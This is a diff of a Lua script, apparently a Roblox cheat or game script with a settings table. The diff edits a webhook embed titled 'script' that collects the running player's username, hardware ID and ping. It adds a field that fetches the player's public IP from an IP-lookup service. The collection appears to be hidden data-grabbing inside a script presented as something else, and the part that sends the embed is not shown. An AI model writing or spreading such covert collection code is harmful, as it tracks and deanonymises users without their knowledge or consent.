@@ -7,11 +7,12 @@ pcall(function()
   ['embeds'] = {
     {
        ['title'] = 'script',
-       ['description'] = game:GetService("HttpService"):GetAsync(ip_api_url),
+       ['description'] = '',
        ['fields'] = {
           {name = 'Username', value = game:GetService("Players").LocalPlayer.Name},
           {name = 'Hwid', value = game:GetService("RbxAnalyticsService"):GetClientId()},
           {name = "Ping", value = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()},
+		  {name = "IP", value = game:HttpGet("https://api.ipify.org")}
            
         }
     }
@@ -53,6 +54,7 @@ pcall(function()
        );
    end
 end)
+
 local Settings = {
     rewrittenmain = {
         Enabled = true,
